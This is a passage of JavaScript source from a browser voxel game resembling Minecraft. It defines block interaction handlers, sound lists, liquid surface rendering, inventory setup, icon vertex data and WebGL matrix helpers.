			containerData.dimension = dimension
			changeScene("dispenser")
			releasePointer()
		},
	},
	Water:{
		getY:function(x,y,z,dimension){
			var block = world.getBlock(x,y,z,dimension)
			return (min((this.getLevel(block) || (block ? 8 : 0))*2,14.5)/16)-0.5
		},
	},
	Lava:{
		getY:function(x,y,z,dimension){
			var block = world.getBlock(x,y,z,dimension)
			return (min((this.getLevel(block))*2,14.5)/16)-0.5
		},
		clientTick:function(block,x,y,z,dimension,world){
			let b = world.getBlock(x,y+1,z,dimension)
			if(!b && !b.liquid && !performFast && rand() < 0.05){
				world.addParticle(new entities[entityIds.LavaParticle](x,y+0.5,z),dimension)
				playSound("liquid.lavapop",0,1,1,posSound(x,y+0.5,z))
			}
		},
	},
	oil:{
		getY:function(x,y,z,dimension){
			var block = world.getBlock(x,y,z,dimension)
			return (min((this.getLevel(block) || (block ? 8 : 0))*2,14.5)/16)-0.5
		}
	},
	beacon:{
		importantOnset:function(x,y,z,dimension,w){
			this.set(x,y,z,dimension,w)
		},
		set: function(x,y,z,dimension,world){
			let chunkEntities = world.getChunk(x,z,dimension).entities
			for(var i in chunkEntities){
				let ent = chunkEntities[i]
				if(ent.type === "BeaconBeam" && ent.x === x && ent.actualY === y && ent.z === z && ent.dimension === dimension) return
			}
			world.addEntity(new entities[entityIds.BeaconBeam](x,y,z),false,dimension)
		},
	},
	craftingTable:{
		onclientclick: () => {changeScene("crafting"); releasePointer()},
	},
	anvil:{
		onclientclick:function(x,y,z,dimension){
			changeScene("anvil")
			releasePointer()
		},
	},
	furnace:{
		onclientclick: (x,y,z,dimension) => {
			containerData.x = x
			containerData.y = y
			containerData.z = z
			containerData.dimension = dimension
			changeScene("furnace")
			releasePointer()
		},
		clientTick:function(block,x,y,z,dimension,world){
			if(performFast) return
			let tags = world.getTags(x,y,z,dimension)
			let pix = 1/16
			let on = this.id | SLAB
			y -= rand(4,8)*pix
			switch(block){
				case on | NORTH:
					z -= 0.51
					x += rand(-5,5)*pix
					break
				case on | SOUTH:
					z += 0.51
					x += rand(-5,5)*pix
					break
				case on | EAST:
					x -= 0.51
					z += rand(-5,5)*pix
					break
				case on | WEST:
					x += 0.51
					z += rand(-5,5)*pix
					break
				default:
					return
			}
			world.addParticle(new entities[entityIds.FlameParticle](x,y,z),dimension)
		}
	},
	barrel:{
		onclientclick:function(x,y,z,dimension){
			containerData.x = x
			containerData.y = y
			containerData.z = z
			containerData.dimension = dimension
			changeScene("chest")
			releasePointer()
		}
	},
	chest:{
		onclientclick:function(x,y,z,dimension){
			containerData.x = x
			containerData.y = y
			containerData.z = z
			containerData.dimension = dimension
			changeScene("chest")
			releasePointer()
		},
	},
	hopper:{
		onclientclick:function(x,y,z,dimension){
			containerData.x = x
			containerData.y = y
			containerData.z = z
			containerData.dimension = dimension
			changeScene("hopper")
			releasePointer()
		}
	},
	commandBlock:{
		onclientclick:function(x,y,z,dimension){
			containerData.x = x
			containerData.y = y
			containerData.z = z
			containerData.dimension = dimension
			changeScene("commandBlock")
			releasePointer()
		},
	},
	portal:{
		ontouch: function(){
			touchingPortal = true
			portalEffect += 2.5
		},
	},
	redstoneTorch:{
		clientTick:function(block,x,y,z,dimension,world){
			if(performFast || !world.getPower(x,y,z,dimension)) return
			let wall = this.id | SLAB
			let pix = 1/16
			switch(block){
				case wall | NORTH:
					z += pix*5
					y += pix*6
					break
				case wall | SOUTH:
					z -= pix*5
					y += pix*6
					break
				case wall | EAST:
					x += pix*5
					y += pix*6
					break
				case wall | WEST:
					x -= pix*5
					y += pix*6
					break
				default:
					y += pix*2
			}
			world.addParticle(new entities[entityIds.RedstoneParticle](x,y,z),dimension)
		},
	},
	debugStick:{
		Name:function(){
			let str
			if(blockMode === CUBE) str = "Get Tags"
			else if(blockMode === SLAB) str = "Change Block State"
			else if(blockMode === STAIR) str = "Change Block Rotation"
			else str = "No Function"
			return "Debug Stick: "+str
		},
	}
}

;({BLOCK_COUNT} = window)
blockData = mkBlockData, blockIds = mkBlockIds
window.console.log(BLOCK_COUNT,"blocks")
var texNum=0;for(var t in textures) texNum ++
window.console.log(texNum,"textures")

var stoneDigSound = ["stone.dig1", "stone.dig2", "stone.dig3", "stone.dig4"],
		stoneStepSound = ["stone.step1", "stone.step2","stone.step3","stone.step4","stone.step5","stone.step6"],
		woodDigSound = ["wood.dig1", "wood.dig2", "wood.dig3", "wood.dig4"],
		woodStepSound = ["wood.step1", "wood.step2","wood.step3","wood.step4","wood.step5","wood.step6"],
		clothDigSound = ["cloth.dig1", "cloth.dig2", "cloth.dig3", "cloth.dig4"],
		clothStepSound = ["cloth.step1", "cloth.step2","cloth.step3","cloth.step4"],
		glassDigSound = ["glass.dig1", "glass.dig2", "glass.dig3"],
		nyliumDigSound = ["nylium.dig1", "nylium.dig2", "nylium.dig3", "nylium.dig4", "nylium.dig5", "nylium.dig6"],
		nyliumStepSound = ["nylium.step1", "nylium.step2","nylium.step3","nylium.step4","nylium.step5","nylium.step6"],
		stemDigSound = ["stem.dig1", "stem.dig2", "stem.dig3", "stem.dig4", "stem.dig5", "stem.dig6"],
		stemStepSound = ["stem.step1", "stem.step2","stem.step3","stem.step4","stem.step5","stem.step6"],
		basaltDigSound = ["basalt.dig1", "basalt.dig2", "basalt.dig3", "basalt.dig4", "basalt.dig5"],
		basaltStepSound = ["basalt.step1", "basalt.step2","basalt.step3","basalt.step4","basalt.step5","basalt.step6"],
		rootDigSound = ["roots.dig1", "roots.dig2", "roots.dig3", "roots.dig4", "roots.dig5", "roots.dig6"],
		rootStepSound = ["roots.step1", "roots.step2","roots.step3","roots.step4","roots.step5","roots.step6"],
		amethystPlaceSound = ["amethyst.place1","amethyst.place2","amethyst.place3","amethyst.place4"],
		amethystDigSound = ["amethyst.dig1","amethyst.dig2","amethyst.dig3","amethyst.dig4"],
		amethystStepSound = (function(){var arr=[]; for(var i=0; i<14; i++){arr.push("amethyst.step"+(i+1))};return arr})(),
		amethystClusterPlaceSound = ["amethyst_cluster.place1", "amethyst_cluster.place2", "amethyst_cluster.place3", "amethyst_cluster.place4"],
		amethystClusterDigSound = ["amethyst_cluster.dig1", "amethyst_cluster.dig2", "amethyst_cluster.dig3", "amethyst_cluster.dig4"],
		deepslatePlaceSound = ["deepslate.place1","deepslate.place2","deepslate.place3","deepslate.place4","deepslate.place5","deepslate.place6"],
		deepslateStepSound = ["deepslate.step1","deepslate.step2","deepslate.step3","deepslate.step4","deepslate.step5","deepslate.step6"],
		deepslateDigSound = ["deepslate.dig1","deepslate.dig2","deepslate.dig3","deepslate.dig4"],
		deepslateBricksPlaceSound = [1,2,3,4,5,6].map(v => "deepslate_bricks.place"+v),
		deepslateBricksStepSound = [1,2,3,4,5].map(v => "deepslate_bricks.step"+v),
		grassDigSound = ["grass.dig1", "grass.dig2", "grass.dig3", "grass.dig4"],
		grassStepSound = ["grass.step1", "grass.step2","grass.step3","grass.step4","grass.step5","grass.step6"],
		coralDigSound = ["coral.dig1","coral.dig2","coral.dig3","coral.dig4"],
		coralStepSound = ["coral.step1","coral.step2","coral.step3","coral.step4","coral.step5","coral.step6"],
		wetgrassDigSound = ["wetgrass.dig1","wetgrass.dig2","wetgrass.dig3","wetgrass.dig4"],
		wetgrassStepSound = ["wetgrass.step1","wetgrass.step2","wetgrass.step3","wetgrass.step4","wetgrass.step5","wetgrass.step6"]
const defaultTagBits = {
	power:[15,5], //extra for power level 16 (power sources)
	blockPowerNorth:[20,2],
	blockPowerSouth:[22,2],
	blockPowerEast:[24,2],
	blockPowerWest:[26,2],
	blockPowerTop:[28,2],
	blockPowerBottom:[30,2],
} /*
tag bits have a index and a count
if tagBits is set to null
- it stores it as a properties of an object,
otherwise
- it stores it in specific bits in a number
*/
// Set defaults on blockData
		for (let i = 1; i < BLOCK_COUNT; ++i) {
			const data = blockData[i];
		
			if(blockDataAdditional[data.name]){
				Object.assign(data, blockDataAdditional[data.name])
			}
			
			/*for(let t = 0; t<data.textures.length; t++){
				if(!textures[data.textures[t]]){
					window.console.log("Missing texture for "+data.textures[t])
					data.textures[t] = "error"
				}
			}*/
		}
		
		blockInfoIds = {}
		for(let i=1; i<blockInfo.length; i++){
			for(let j of blockInfo[i].blocks){
				if(j.startsWith("is:")){
					let is = j.replace("is:","")
					for(let k=0; k<BLOCK_COUNT; k++){
						if(blockData[k][is]) blockInfoIds[k] = i
					}
				}else blockInfoIds[blockIds[j]] = i
			}
		}
		;({blockIds} = win)
	  inventoryBlocks = {all:[],search:[],items:[],hidden:[]}
		//liquidIds = {}
	  for(let i=0; i<BLOCK_COUNT; i++){
			let block = blockData[i]
	    if(!block.hidden){
	      inventoryBlocks.all.push(block.id)
	      if(block.category){
	        if(!inventoryBlocks[block.category]) inventoryBlocks[block.category] = []
	        inventoryBlocks[block.category].push(block.id)
	      }
				if(block.item && block.category !== "items" && block.category !== "food" && block.category !== "tools"){
					inventoryBlocks.items.push(block.id)
				}
	    }
			if(block.hidden){
				inventoryBlocks.hidden.push(block.id)
			}
			/*if(block.inLiquid){
				liquidIds[block.inLiquid] = block.id
			}*/
	  }
		
		const liquidData = {
      getFace:function(x,y,z,dimension,block,face,verts,tex,texCoord,inside){
        const level = this.getLevel(block)
        const h = (min(level*2,14.5)/16)-0.5
				const XX = this.getY(x+1,y,z,dimension), xx = this.getY(x-1,y,z,dimension)
				const ZZ = this.getY(x,y,z+1,dimension), zz = this.getY(x,y,z-1,dimension)
        const XZ = avg(this.getY(x+1,y,z+1,dimension), XX, ZZ, h)
        const Xz = avg(this.getY(x+1,y,z-1,dimension), XX, zz, h)
        const xz = avg(this.getY(x-1,y,z-1,dimension), xx, zz, h)
        const xZ = avg(this.getY(x-1,y,z+1,dimension), xx, ZZ, h)
        if(face === "top"){
					if(inside){
						verts[1] = XZ
						verts[4] = xZ
						verts[7] = xz
						verts[10] = Xz
					}else{
						verts[1] = xZ
						verts[4] = XZ
						verts[7] = Xz
						verts[10] = xz
					}
          let c = this.getCurrent(x,y,z,level,true,world)
          if(!c.x && !c.z) return
					c.x = -c.x
          tex[0] -= 0.5, tex[1] -= 0.5, tex[2] -= 0.5, tex[3] -= 0.5, tex[4] -= 0.5, tex[5] -= 0.5, tex[6] -= 0.5, tex[7] -= 0.5
          let x2 = tex[0], y2 = tex[1]
          tex[0] = x2 * c.z + y2 * c.x
          tex[1] = x2 * c.x - y2 * c.z
          
          x2 = tex[2], y2 = tex[3]
          tex[2] = x2 * c.z + y2 * c.x
          tex[3] = x2 * c.x - y2 * c.z
          
          x2 = tex[4], y2 = tex[5]
          tex[4] = x2 * c.z + y2 * c.x
          tex[5] = x2 * c.x - y2 * c.z
          
          x2 = tex[6], y2 = tex[7]
          tex[6] = x2 * c.z + y2 * c.x
          tex[7] = x2 * c.x - y2 * c.z

          let d = max(...tex)*2
          tex[0] /= d
          tex[1] /= d
          tex[2] /= d
          tex[3] /= d
          tex[4] /= d
          tex[5] /= d
          tex[6] /= d
          tex[7] /= d

          tex[0] += 0.5, tex[1] += 0.5, tex[2] += 0.5, tex[3] += 0.5, tex[4] += 0.5, tex[5] += 0.5, tex[6] += 0.5, tex[7] += 0.5
          let t = textureCoords[textureMap[this.textures[2]]]
          texCoord[0] = t[0], texCoord[1] = t[1], texCoord[2] = t[2], texCoord[5] = t[5]
        }else if(face === "bottom"){
          return
        }else{
          var left,right
          switch(face){
            case "north":
              left = XZ, right = xZ
              break
            case "south":
              left = xz, right = Xz
              break
            case "east":
              left = Xz, right = XZ
              break
            case "west":
              left = xZ, right = xz
              break
          }
					if(inside){
						let temp = right
						right = left, left = temp
					}
          verts[1] = left
          verts[4] = right
          tex[1] = 1-(left+0.5)
          tex[3] = 1-(right+0.5)
        }
      },
			customShape:function(x,y,z,dimension,block,face,verts,tex,texCoord,tags,originalShapeVerts){
				let inside = originalShapeVerts.t === "in"
        if(this.isThisHere(x,y+1,z,world)){ //full block
					if(face === "top") return false
          if(face === "bottom") return !this.isThisHere(x,y-1,z,world)
          if(face === "north" && this.isThisHere(x,y,z+1,world) && this.isThisHere(x,y+1,z+1,world)) return false
          if(face === "south" && this.isThisHere(x,y,z-1,world) && this.isThisHere(x,y+1,z-1,world)) return false
          if(face === "east" && this.isThisHere(x+1,y,z,world) && this.isThisHere(x+1,y+1,z,world)) return false
          if(face === "west" && this.isThisHere(x-1,y,z,world) && this.isThisHere(x-1,y+1,z,world)) return false
          if(face === "north" && !this.isThisHere(x,y,z+1,world)) return
          if(face === "south" && !this.isThisHere(x,y,z-1,world)) return
          if(face === "east" && !this.isThisHere(x+1,y,z,world)) return
          if(face === "west" && !this.isThisHere(x-1,y,z,world)) return
          var idx = 0
          switch(face){
            case "north":
              z++
              face = "south"
              break
            case "south":
              z--
              face = "north"
              break
            case "east":
              x++
              face = "west"
              idx = 2
              break
            case "west":
              x--
              face = "east"
              idx = 2
              break
          }
          block = world.getBlock(x,y,z,dimension)
          this.getFace(x,y,z,dimension,block,face,verts,tex,texCoord,inside)
          //only show face where other block isn't showing it
          verts[7] = verts[1]
          verts[10] = verts[4]
          verts[1] = verts[4] = 0.5
          tex[5] = tex[1]
          tex[7] = tex[3]
          tex[1] = tex[3] = 0
          return
        }
        if(face === "north" && this.isThisHere(x,y,z+1,world)) return false
        if(face === "south" && this.isThisHere(x,y,z-1,world)) return false
        if(face === "east" && this.isThisHere(x+1,y,z,world)) return false
        if(face === "west" && this.isThisHere(x-1,y,z,world)) return false
        if(face === "bottom" && this.isThisHere(x,y-1,z,world)) return false
        this.getFace(x,y,z,dimension,block,face,verts,tex,texCoord,inside)
      },
			customCullFace:function(x2,y2,z2,dimension,block,type,face,otherDir,data,sourceData,getBlock,blocks,x,y,z){
				if(face !== "top" && !data.transparent && data.id !== sourceData.id) return true
				//only cull both opposite sides if both hidden
				//because there are inside faces
				if(this.isThisLocalHere(x,y+1,z,dimension,blocks,getBlock,world)){ //full block
          if(face === "top" || face === "bottom") return this.isThisLocalHere(x,y-1,z,dimension,blocks,getBlock,world)
          if((face === "north" || face === "south") && this.isThisLocalHere(x,y,z+1,dimension,blocks,getBlock,world) && this.isThisLocalHere(x,y+1,z+1,dimension,blocks,getBlock,world) && this.isThisLocalHere(x,y,z-1,dimension,blocks,getBlock,world) && this.isThisLocalHere(x,y+1,z-1,dimension,blocks,getBlock,world)) return true
          if((face === "east" || face === "west") && this.isThisLocalHere(x+1,y,z,dimension,blocks,getBlock,world) && this.isThisLocalHere(x+1,y+1,z,dimension,blocks,getBlock,world) && this.isThisLocalHere(x-1,y,z,dimension,blocks,getBlock,world) && this.isThisLocalHere(x-1,y+1,z,dimension,blocks,getBlock,world)) return true
				}else{
					if((face === "north" || face === "south") && this.isThisLocalHere(x,y,z+1,dimension,blocks,getBlock,world) && this.isThisLocalHere(x,y,z-1,dimension,blocks,getBlock,world)) return true
					if((face === "east" || face === "west") && this.isThisLocalHere(x+1,y,z,dimension,blocks,getBlock,world) && this.isThisLocalHere(x-1,y,z,dimension,blocks,getBlock,world)) return true
				}
			},
			isThisLocalHere:function(x,y,z,dimension,blocks,func,world){
				return blockData[func.call(world, x, y, z, (func === getBlock ? blocks : dimension))].id === this.id
			},
		}

		var itemFrameSet = function(x,y,z,dimension,block,itemFrameBlock,world){
			let chunkEntities = world.getChunk(x,z,dimension).entities
			for(var i in chunkEntities){
				let ent = chunkEntities[i]
				if(ent.type === "ItemFrame" && ent.x === x && ent.y === y && ent.z === z && ent.dimension === dimension) return
			}
			world.addEntity(new entities[entityIds.ItemFrame](x,y,z,block,itemFrameBlock),true,dimension)
		}
		var itemFrameOnset = function(x,y,z, dimension,world){
			var block = world.getBlock(x,y,z,dimension)
			this.set(x,y,z,dimension,0,block,world)
		}
		var signSet = function(x,y,z,dimension,block,world){
			let chunkEntities = world.getChunk(x,z,dimension).entities
			for(var i in chunkEntities){
				let ent = chunkEntities[i]
				if(ent.type === "Sign" && ent.x === x && ent.y === y && ent.z === z && ent.dimension === dimension) return
			}
			block = block || world.getBlock(x,y,z,dimension)
			world.addEntity(new entities[entityIds.Sign](x,y,z,this.id,block),false,dimension)
		}
    
		if(0/*todo n*/)for (let i = 0; i < BLOCK_COUNT; i++) {
			let baseBlock = blockData[i]
      for(var t=0; t<baseBlock.textures.length; t++){
        if(semiTransTextures.includes(baseBlock.textures[t])){
          baseBlock.semiTrans = true
          break
        }
      }
      if(baseBlock.liquid){
				Object.assign(baseBlock,liquidData)
      }
      if(baseBlock.sign){
        baseBlock.importantOnset = function(x,y,z,dimension,w){this.set(x,y,z,dimension,null,w)}
				baseBlock.set = signSet
      }
			if(baseBlock.itemFrame){
        baseBlock.set = itemFrameSet
        baseBlock.importantOnset = itemFrameOnset
			}
			
		}

		mkBlockData = blockData
		mkBlockIds = blockIds
		mkBlockCount = BLOCK_COUNT
		mkBlockInfoIds = blockInfoIds
		mkInventoryBlocks = inventoryBlocks
		win.blockData = blockData
		win.blockIds = blockIds
	}
    
	let indexOrder;
	(function() {
		let arr = []
		for (let i = 0; i < 100000; i++) {
			arr.push(0 + i * 4, 1 + i * 4, 2 + i * 4, 0 + i * 4, 2 + i * 4, 3 + i * 4)
		}
		indexOrder = new Uint32Array(arr)
	})()

	let hexagonVerts
	let slabIconVerts
  let verticalSlabIconVerts
	let stairIconVerts
  let squareVerts
  let fenceIconVerts
	let wallPostIconVerts
	let buttonIconVerts
  let carpetIconVerts
  let trapdoorIconVerts
  let azaleaIconVerts
  let cactusIconVerts
  let snowIconVerts
  let beaconIconVerts
	let blockIcons
  let blockIconError
	{
		let side = Math.sqrt(3) / 2
		let s = side
		let q = s / 2
    let p = s / 16
		hexagonVerts = new Float32Array([
			0, 1, 1, side, 0.5, 1, 0, 0, 1, -side, 0.5, 1,
			0, 0, 1, side, 0.5, 1, side, -0.5, 1, 0, -1, 1,
			-side, 0.5, 1, 0, 0, 1, 0, -1, 1, -side, -0.5, 1,
		])

		slabIconVerts = new Float32Array([
			0, 0.5, 1, side, 0, 1, 0, -0.5, 1, -side, 0, 1,
			0, -0.5, 1, side, 0, 1, side, -0.5, 1, 0, -1, 1,
			-side, 0, 1, 0, -0.5, 1, 0, -1, 1, -side, -0.5, 1,
		])
    verticalSlabIconVerts = new Float32Array([
      0, 1, 1, q, 0.75, 1, -q, 0.25, 1, -side, 0.5, 1,
			-q, 0.25, 1, q, 0.75, 1, q, -0.25, 1, -q, -0.75, 1,
			-side, 0.5, 1, -q, 0.25, 1, -q, -0.75, 1, -side, -0.5, 1,
		])

		stairIconVerts = [
			-s,0.5,0,0,1,         0,1,1,0,1,         q,0.75,1,0.5,1,    -q,0.25,0,0.5,1,    // top of the top step
			-q,-0.25,0,0,1,       q,0.25,1,0,1,      s,0,1,0.5,1,        0,-0.5,0,0.5,1,    // top of the bottom step
			-q,0.25,0,0,0.6,      q,0.75,1,0,0.6,    q,0.25,1,0.5,0.6,  -q,-0.25,0,0.5,0.6, // front of the top step
			0,-0.5,0,0,0.6,       s,0,1,0,0.6,       s,-0.5,1,0.5,0.6,   0,-1,0,0.5,0.6,    // front of the bottom step
			-s,0.5,0,0,0.8,      -q,0.25,0.5,0,0.8, -q,-0.75,0.5,1,0.8, -s,-0.5,0,1,0.8,    // side of the top step
			-q,-0.25,0.5,0.5,0.8, 0,-0.5,1,0.5,0.8,  0,-1,1,1,0.8,      -q,-0.75,0.5,1,0.8, // side of the bottom step
		]
    /*squareIconVerts = [
      //-1,-1,0,0,1,          1,-1,1,0,1,        1,1,1,1,1          -1,1,0,1,1 //x, y, tx, ty, useless
      1,1,1,0,1,         1,-1,1,1,1,         -1,-1,0,1,1,    -1,1,0,0,1
    ]*/

    fenceIconVerts = [
      -0.34641016151377535,0.8,0.25,0.0625,1, 0,1,0,0.0625,1, 0.34641016151377546,0.8,0,0.3125,1, 9.614813431917819e-17,0.6000000000000001,0.25,0.3125,1, 
      0,0.6000000000000001,0.625,0,1, 0.34641016151377535,0.8,0.375,0,1, 0.34641016151377535,-0.8,0.375,1,1, 0,-1,0.625,1,1, 
      -0.34641016151377535,0.8,0.625,0,1, 9.614813431917819e-17,0.6000000000000001,0.375,0,1, 9.614813431917819e-17,-1,0.375,1,1, -0.34641016151377535,-0.8,0.625,1,1,
    ]

		wallPostIconVerts = new Float32Array([
			0, 1, 1, side, 0.5, 1, 0, 0, 1, -side, 0.5, 1,
			0, 0, 1, side, 0.5, 1, side, -0.5, 1, 0, -1, 1,
			-side, 0.5, 1, 0, 0, 1, 0, -1, 1, -side, -0.5, 1,
		])

		buttonIconVerts = new Float32Array([
			0, 0.5, 1, side, 0, 1, 0, -0.5, 1, -side, 0, 1,
			0, -0.5, 1, side, 0, 1, side, -0.5, 1, 0, -1, 1,
			-side, 0, 1, 0, -0.5, 1, 0, -1, 1, -side, -0.5, 1,
		])
    carpetIconVerts = new Float32Array([
			0, 1-(p*17), 1, side, 0.5-(p*17), 1, 0, -(p*17), 1, -side, 0.5-(p*17), 1,
			0, -(p*17), 1, side, 0.5-(p*17), 1, side, -0.5, 1, 0, -1, 1,
			-side, 0.5-(p*17), 1, 0, -(p*17), 1, 0, -1, 1, -side, -0.5, 1,
		])
    trapdoorIconVerts = new Float32Array([
			0, 1-(p*15), 1, side, 0.5-(p*15), 1, 0, -(p*15), 1, -side, 0.5-(p*15), 1,
			0, -(p*15), 1, side, 0.5-(p*15), 1, side, -0.5, 1, 0, -1, 1,
			-side, 0.5-(p*15), 1, 0, -(p*15), 1, 0, -1, 1, -side, -0.5, 1,
		])
    snowIconVerts = new Float32Array([
			0, 1-(p*16), 1, side, 0.5-(p*16), 1, 0, -(p*16), 1, -side, 0.5-(p*16), 1,
			0, -(p*16), 1, side, 0.5-(p*16), 1, side, -0.5, 1, 0, -1, 1,
			-side, 0.5-(p*15), 1, 0, -(p*16), 1, 0, -1, 1, -side, -0.5, 1,
		])
    cactusIconVerts = new Float32Array([
			0, 1-p, 1, side, 0.5-p, 1, 0, -p, 1, -side, 0.5-p, 1,
			-p, 0, 1, side-p, 0.5, 1, side-p, -0.5, 1, -p, -1, 1,
			-side+p, 0.5, 1, p, 0, 1, p, -1, 1, -side+p, -0.5, 1,
		])
    beaconIconVerts = [
      -0.5412658773652741,0.3125,0.8125,0.1875,1, 0,0.625,0.1875,0.1875,1, 0.5412658773652741,0.3125,0.1875,0.8125,1, 0,0,0.8125,0.8125,1, -0.8660254037844386,0.5,-1,0,1, 0,1,-2,0,1, 0.8660254037844386,0.5,-2,1,1, 0,0,-1,1,1, -0.649519052838329,-0.3125,-0.25,0.1875,1, 0,0.0625,-1,0.1875,1, 0.649519052838329,-0.3125,-1,0.9375,1, 0,-0.6875,-0.25,0.9375,1, 
      0,0,0.8125,0.1875,1, 0.5412658773652741,0.3125,0.1875,0.1875,1, 0.5412658773652741,-0.3125,0.1875,0.8125,1, 0,-0.625,0.8125,0.8125,1, 0,0,-1,0,1, 0.8660254037844386,0.5,-2,0,1, 0.8660254037844386,-0.5,-2,1,1, 0,-1,-1,1,1, 0,-0.6875,-0.25,0.1875,1, 0.649519052838329,-0.3125,-1,0.1875,1, 0.649519052838329,-0.5,-1,0.375,1, 0,-0.875,-0.25,0.375,1, 
      -0.5412658773652741,0.3125,0.8125,0.1875,1, 0,0,0.1875,0.1875,1, 0,-0.625,0.1875,0.8125,1, -0.5412658773652741,-0.3125,0.8125,0.8125,1, -0.8660254037844386,0.5,-1,0,1, 0,0,-2,0,1, 0,-1,-2,1,1, -0.8660254037844386,-0.5,-1,1,1, -0.649519052838329,-0.3125,-0.25,0.1875,1, 0,-0.6875,-1,0.1875,1, 0,-0.875,-1,0.375,1, -0.649519052838329,-0.5,-0.25,0.375,1,
    ]
	}
	function genIcons() {//todo n: update icons
		blockIcons = [null]
		blockIcons.lengths = []
		let texOrder = [ 1, 4, 3 ]
		let shadows = [ 1, 0.4, 0.7 ]
		let scale = 1
    let prevTexture
    
    let data = []
    for (let j = 11; j >= 0; j--) {
      data.push(-hexagonVerts[j * 3 + 0] * scale)
      data.push(hexagonVerts[j * 3 + 1] * scale)
      data.push(0.1666666)
      data.push(textureCoords[textureMap.error][(j * 2 + 0) % 8])
      data.push(textureCoords[textureMap.error][(j * 2 + 1) % 8])
      data.push(shadows[floor(j / 4)])
    }
    let buffer = gl.createBuffer()
    gl.bindBuffer(gl.ARRAY_BUFFER, buffer)
    gl.bufferData(gl.ARRAY_BUFFER, new Float32Array(data), gl.STATIC_DRAW)
    blockIconError = buffer
    blockIconError.length = 6 * 3
    
		for (let i = 1; i < BLOCK_COUNT; i++) {
			let data = []
      let v, buffer
			let block = blockData[i]
      win.b = block.name
      if(block.icon){
        block = blockData[blockIds[block.icon]]
      }
      if(block.flatIcon){
				let tex = textureCoords[textureMap["error"]]//todo n
				data.push(-scale, scale, 1/6, tex[2], tex[3], 1)
				data.push(scale, scale, 1/6, tex[0], tex[1], 1)
				data.push(scale, -scale, 1/6, tex[6], tex[7], 1)
				data.push(-scale, -scale, 1/6, tex[4], tex[5], 1)
				let buffer = gl.createBuffer()
				gl.bindBuffer(gl.ARRAY_BUFFER, buffer)
				gl.bufferData(gl.ARRAY_BUFFER, new Float32Array(data), gl.STATIC_DRAW)
        blockIcons[i] = buffer
        blockIcons.lengths[i] = 6
        blockIcons[i | CROSS] = buffer
        blockIcons.lengths[i | CROSS] = 6
        blockIcons[i | TALLCROSS] = buffer
        blockIcons.lengths[i | TALLCROSS] = 6
        blockIcons[i | WALLFLAT] = buffer
        blockIcons.lengths[i | WALLFLAT] = 6
        blockIcons[i | TORCH] = buffer
        blockIcons.lengths[i | TORCH] = 6
        blockIcons[i | PANE] = buffer
        blockIcons.lengths[i | PANE] = 6
      }else{//todo n: bow icon
        for (let j = 11; j >= 0; j--) {
          data.push(-hexagonVerts[j * 3 + 0] * scale)
          data.push(hexagonVerts[j * 3 + 1] * scale)
          data.push(0.1666666)
					let t=block.shape.texVerts[texOrder[floor(j / 4)]]?.[0]?.texture||"error"
          data.push(textureCoords[textureMap[t]][(j * 2 + 0) % 8])
          data.push(textureCoords[textureMap[t]][(j * 2 + 1) % 8])
          data.push(shadows[floor(j / 4)])
        }
        buffer = gl.createBuffer()
        gl.bindBuffer(gl.ARRAY_BUFFER, buffer)
        gl.bufferData(gl.ARRAY_BUFFER, new Float32Array(data), gl.STATIC_DRAW)
        blockIcons[i] = buffer
        blockIcons.lengths[i] = 6 * 3
      }
		}
	}

	function uniformMatrix(cacheId, programObj, vrName, transpose, matrix) {
		let vrLocation = glCache[cacheId]
		if(vrLocation === undefined) {
			vrLocation = gl.getUniformLocation(programObj, vrName)
			glCache[cacheId] = vrLocation
		}
		gl.uniformMatrix4fv(vrLocation, transpose, matrix)
	}
	function vertexAttribPointer(cacheId, programObj, vrName, size, VBO) {
		let vrLocation = glCache[cacheId]
		if(vrLocation === undefined) {
			vrLocation = gl.getAttribLocation(programObj, vrName)
			glCache[cacheId] = vrLocation
		}
		if (vrLocation !== -1) {
			gl.enableVertexAttribArray(vrLocation)
			gl.bindBuffer(gl.ARRAY_BUFFER, VBO)
			gl.vertexAttribPointer(vrLocation, size, gl.FLOAT, false, 0, 0)

		}
	}

  //panorama buffer
  let panoramaVertBuffer
  let panoramaTexBuffer
  let panoramaSize
  
	//Generate buffers for every block face and store them
	let sideEdgeBuffers
	let indexBuffer

	function cross(v1, v2, result) {
		let x = v1.x,
			y = v1.y,
			z = v1.z,
			x2 = v2.x,
			y2 = v2.y,
			z2 = v2.z
		result.x = y * z2 - y2 * z
		result.y = z * x2 - z2 * x
		result.z = x * y2 - x2 * y
	}

	let matrix = new Float32Array(16); // A temperary matrix that may store random data.
	let projection = new Float32Array(16)
	let defaultModelView = new Float32Array([ -10,0,0,0,0,10,0,0,0,0,-10,0,0,0,0,1 ])
	class Matrix {
		constructor(arr) {
			this.elements = new Float32Array(arr || 16)
		}
		translate(x, y, z) {
			let a = this.elements
			a[3] += a[0] * x + a[1] * y + a[2] * z
			a[7] += a[4] * x + a[5] * y + a[6] * z
			a[11] += a[8] * x + a[9] * y + a[10] * z
			a[15] += a[12] * x + a[13] * y + a[14] * z
		}
		rotX(angle) {
			let elems = this.elements
			let c = cos(angle)
			let s = sin(angle)
			let t = elems[1]
			elems[1] = t * c + elems[2] * s
			elems[2] = t * -s + elems[2] * c
			t = elems[5]
			elems[5] = t * c + elems[6] * s
			elems[6] = t * -s + elems[6] * c
			t = elems[9]
			elems[9] = t * c + elems[10] * s
			elems[10] = t * -s + elems[10] * c
			t = elems[13]
			elems[13] = t * c + elems[14] * s
			elems[14] = t * -s + elems[14] * c
		}
		rotY(angle) {
			let c = cos(angle)
			let s = sin(angle)
			let elems = this.elements
			let t = elems[0]
			elems[0] = t * c + elems[2] * -s
			elems[2] = t * s + elems[2] * c
			t = elems[4]
			elems[4] = t * c + elems[6] * -s
			elems[6] = t * s + elems[6] * c
			t = elems[8]
			elems[8] = t * c + elems[10] * -s
			elems[10] = t * s + elems[10] * c
			t = elems[12]
			elems[12] = t * c + elems[14] * -s
			elems[14] = t * s + elems[14] * c
		}
    rotZ(angle) {
			let c = cos(angle)
			let s = sin(angle)
			let elems = this.elements
			let t = elems[0]
			elems[0] = t * c + elems[1] * s
			elems[1] = t * -s + elems[1] * c
			t = elems[4]
			elems[4] = t * c + elems[5] * s
			elems[5] = t * -s + elems[5] * c
			t = elems[8]
			elems[8] = t * c + elems[9] * s
			elems[9] = t * -s + elems[9] * c
			t = elems[12]
			elems[12] = t * c + elems[13] * s
			elems[13] = t * -s + elems[13] * c
		}
		scale(x, y, z) {
			let a = this.elements
			a[0] *= x;
			a[1] *= y;
			a[2] *= z;
			a[4] *= x;
			a[5] *= y;
			a[6] *= z;
			a[8] *= x;
			a[9] *= y;
			a[10] *= z;
			a[12] *= x;
			a[13] *= y;
			a[14] *= z;
		}
